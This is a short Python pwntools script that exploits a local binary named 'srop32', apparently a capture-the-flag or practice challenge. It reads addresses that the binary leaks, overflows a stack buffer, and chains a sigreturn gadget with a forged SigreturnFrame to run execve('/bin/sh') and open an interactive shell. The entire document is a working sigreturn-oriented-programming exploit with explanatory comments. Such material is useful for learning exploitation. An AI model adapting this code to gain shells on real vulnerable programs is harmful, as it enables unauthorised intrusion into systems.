from pwn import *

def leak(p):                            	# Leak the address of our planted  
    p.recvuntil("func: 0x")
    func = int(p.recvline(), 16)

    p.recvuntil("/bin/sh: 0x")
    binsh = int(p.recvline(), 16)

    log.info("Func 0x%x. /bin/sh 0x%x" % (func, binsh))

    return func, binsh

context.arch = 'i386'
p = process("./srop32")

func, binsh = leak(p)

'''
   0x8049db6:	mov    eax,0x77
   0x8049dbb:	ret    
   0x8049dbc:	int    0x80
'''

moveax = func + 17
int0x80 = func + 23

frame = SigreturnFrame(kernel='amd64')	# Construct our Sig Return Frame
# print len(frame)
frame.eax = 0x0b				# Syscall to call
frame.ebx = binsh                   		# First argument to execve
frame.eip = int0x80                 		# Return here after the syscall    
# print len(frame)

payload = 'A' * 0x10                	# Overflow the buffer
payload += p32(moveax)              	# Mov 0x77 into eax (SYS_sigreturn)
payload += p32(int0x80)             	# Evoke the syscall
payload += str(frame)               	# Fill the stack with our sigreturn frame
    
# print len(payload)
p.sendline(payload)
p.interactive()
